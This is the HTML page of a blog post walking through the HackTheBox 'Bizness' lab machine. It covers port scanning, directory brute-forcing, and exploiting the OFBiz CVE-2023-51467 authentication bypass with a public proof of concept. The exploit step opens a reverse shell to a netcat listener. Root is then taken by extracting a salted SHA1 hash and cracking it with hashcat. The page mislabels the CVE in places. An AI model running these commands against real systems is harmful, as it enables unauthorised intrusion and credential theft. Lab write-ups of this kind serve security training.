@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Bizness HTB Walkthrough · Chief Dennis&#39; Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Dennis Drebitca">
+<meta name="description" content="The Bizness HTB machine is an easy difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- Dirsearch- CVE-2023-51467- Grep, find and strings- HashcatReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.252 -Pn -oG nmap_inicial Where the arguments mean:
+-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:">
+<meta name="keywords" content="blog,developer,personal,cybersecurity,IT,cloud">
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Bizness HTB Walkthrough"/>
+<meta name="twitter:description" content="The Bizness HTB machine is an easy difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- Dirsearch- CVE-2023-51467- Grep, find and strings- HashcatReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.252 -Pn -oG nmap_inicial Where the arguments mean:
+-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:"/>
+
+<meta property="og:title" content="Bizness HTB Walkthrough" />
+<meta property="og:description" content="The Bizness HTB machine is an easy difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:
+- Dirsearch- CVE-2023-51467- Grep, find and strings- HashcatReconnaissanceLink to headingWe start a broad Nmap scan by executing the following command:
+sudo nmap -sS -T5 -vvv -p- 10.10.11.252 -Pn -oG nmap_inicial Where the arguments mean:
+-sS: SYN port scan-T5: Using timing template 5 of NMAP-vvv: Triple verbose so NMAP prints a lot of information-p-: All ports are scanned-Pn: Skips Host Discovery-oG: Grep FormatThe scan returns the following information:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chiefdennis.github.io/posts/htb_bizness/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-02T13:07:16+01:00" />
+<meta property="article:modified_time" content="2024-02-02T13:07:16+01:00" />
+
+
+
+
+
+
+<link rel="canonical" href="https://chiefdennis.github.io/posts/htb_bizness/">
+
+
+<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.e1bdf152d93b060b06ba5d496486ed9c201a8b95d335e035beb5faebe3b61cad.css" integrity="sha256-4b3xUtk7BgsGul1JZIbtnCAai5XTNeA1vrX66&#43;O2HK0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.min.2a79daf6f50f047418cd5f1adc44afa5a9ae0e8b4a05eb7e390d42591bde2719.css" integrity="sha256-Knna9vUPBHQYzV8a3ESvpamuDotKBet&#43;OQ1CWRveJxk=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Chief Dennis&#39; Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Catch The Flag</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/projects/">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/contact/">Contact me</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://chiefdennis.github.io/posts/htb_bizness/">
+              Bizness HTB Walkthrough
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-02-02T13:07:16&#43;01:00">
+                February 2, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa fa-user" aria-hidden="true"></i>
+    <a href="/authors/dennis-drebitca/">Dennis Drebitca</a></div>
+
+          
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hash-cracking/">Hash cracking</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/hashcat/">Hashcat</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/cve-2023-51457/">CVE-2023-51457</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/dirsearch/">Dirsearch</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p><img src="15.png#center" alt="image"></p>
+<p>The Bizness HTB machine is an easy difficulty level HackTheBox Machine. The main techniques and tools used to crack this machine are:</p>
+<pre><code>- Dirsearch
+- CVE-2023-51467
+- Grep, find and strings
+- Hashcat
+</code></pre>
+<h2 id="reconnaissance">
+  Reconnaissance
+  <a class="heading-link" href="#reconnaissance">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>We start a broad Nmap scan by executing the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sS -T5 -vvv -p- 10.10.11.252 -Pn -oG nmap_inicial
+</span></span></code></pre></div><p>Where the arguments mean:</p>
+<pre><code>-sS: SYN port scan
+-T5: Using timing template 5 of NMAP
+-vvv: Triple verbose so NMAP prints a lot of information
+-p-: All ports are scanned
+-Pn: Skips Host Discovery
+-oG: Grep Format
+</code></pre>
+<p>The scan returns the following information:</p>
+<p><img src="1.png" alt="image"></p>
+<p>It looks like ports 20 and 80 and 443 are open. Classic open ports for SSH and HTTP/HTTPS. Next, we run a more comprehensive scan on the open ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sCV -p22,80,443 10.10.11.252 -oN nmap_exhaustivo -v
+</span></span></code></pre></div><p>Now the arguments used mean:</p>
+<pre><code>-sCV: Launches all scanning scripts to discover services and versions running on these ports
+-oN: Normal output format
+-v: Single verbose
+</code></pre>
+<p>The results for this second scan are the following:</p>
+<p><img src="2.png" alt="image"></p>
+<h2 id="directory-discovery">
+  Directory discovery
+  <a class="heading-link" href="#directory-discovery">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Now lets try to enumerate subdirectories via brute force with Dirsearch, a open-source python tool that can be found in <a href="https://github.com/maurosoria/dirsearch.git"  class="external-link" target="_blank" rel="noopener">GitHub</a>.</p>
+<p>First, we add the website to our /etc/hosts file and then we run the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">dirsearch -u https://bizness.htb/ --exclude-status 403,404
+</span></span></code></pre></div><p><img src="5.png" alt="image"></p>
+<p>The directory bruteforce reveals the /control/login page. There is nothing of interest besides the login and Join HTB buttons.</p>
+<p><img src="6.png" alt="image"></p>
+<p>On the down right corner, we can see the release of the OFBiz software.</p>
+<p><img src="7.png" alt="image"></p>
+<p>Doing some investigation, it turns out that Ofbiz is vulnerable to a authentication bypass and RCE because of <a href="https://www.cvedetails.com/cve/CVE-2023-51467/" title="CVE-2023-51467 security vulnerability details"  class="external-link" target="_blank" rel="noopener">CVE-2023-51467</a>.</p>
+<h2 id="initial-access">
+  Initial access
+  <a class="heading-link" href="#initial-access">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>First we clone a <a href="https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC"  class="external-link" target="_blank" rel="noopener">GitHub PoC</a> for CVE-2023-51457 written by the researcher abdoghazy2015. Then, for the PoC to work, we have to download ysoserial-all.jar into the same folder.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
+</span></span></code></pre></div><p>The script doesnt work out of the box. However, its because its written to run with openjdk 11. We have the install that version specifically:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt-install openjdk-11-jdk
+</span></span><span class="line"><span class="cl">sudo apt-install openjdk-11-jre
+</span></span></code></pre></div><p>And then we have to select java 11 by running</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo update-alternatives --config java 
+</span></span></code></pre></div><p>Now we are ready to execute the exploit. We have to run set up a netcat listener in another terminal by running:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -lvnp <span class="m">1234</span>
+</span></span></code></pre></div><p>This is where we are going to catch the reverse shell. Now, to run the exploit, execute:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">bizness</span><span class="o">.</span><span class="n">htb</span> <span class="n">shell</span> <span class="mf">10.10.14.75</span><span class="p">:</span><span class="mi">1234</span>
+</span></span></code></pre></div><p><img src="8.png" alt="image"></p>
+<p>We get the reverse shell.</p>
+<p><img src="3.png" alt="image"></p>
+<p>The user flag can be obteined in the /home/ofbiz directory.</p>
+<p><img src="4.png" alt="image"></p>
+<h2 id="privilege-escalation">
+  Privilege escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>We now have to enumerate this machine. A quick and easy way is to use the find and grep tools to search for files containing interesting strings like admin and password. If we run the following command&hellip;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find . -type f -name <span class="s1">&#39;*Admin*&#39;</span>
+</span></span></code></pre></div><p>&hellip;we can search for a file that has the string &ldquo;Admin&rdquo; in its name. This is how we discover a interesting file:</p>
+<p><img src="9.png" alt="image">
+<img src="10.png" alt="image"></p>
+<p>By reading the file /framework/resources/templates/AdminUserLoginData.xml, we get some sort of password&hellip; but both Hashcat and JohnTheRipper fail to crack it. It might be a salted password, but we have to keep searching in any case.</p>
+<p>There is also a Derby database in the machine. There is a lot of data and files, so we need to search efficiently using strings and grep.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">strings -f * <span class="p">|</span> grep -iE <span class="s2">&#34;pass&#34;</span>
+</span></span></code></pre></div><p><img src="11.png" alt="image"></p>
+<p>It looks like we got another password, in this case it contains the salt. It is the data between the two dollar signs. In this case, the salt is $d$.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">$SHA$d$uP0_QaVBpDWFeo8</span>-dRzDqRwXQ2I
+</span></span></code></pre></div><p>We have to sanitize the hash first, since it looks encoded. We can use <a href="https://gchq.github.io/CyberChef"  class="external-link" target="_blank" rel="noopener">cyberchef</a>:</p>
+<p><img src="12.png" alt="image"></p>
+<p>Now that we have the hash sanitized, its time to crack it using hashcat.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;b8fd3f41a541a435857a8f3e751cc3a91c174362:d&#34;</span> &gt; <span class="nb">hash</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">hashcat -m <span class="m">120</span> -a <span class="m">0</span> -d <span class="m">1</span> ./hash /usr/share/wordlists/rockyou.txt 
+</span></span></code></pre></div><p>We have to use mode 120 for the format of hash that we provided. In this case, it is a SHA1 hash, and the hash format is hash:salt.</p>
+<p><img src="13.png" alt="image"></p>
+<p>We got the password!! Now we just have to run su and enter the password to get a root terminal.</p>
+<p><img src="14.png" alt="image"></p>
+<p>Lastly, we can grab the root flag and the machine is done!!</p>
+<p><img src="15.png" alt="image"></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2023 -
+    
+    2024
+     Dennis Drebitca 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
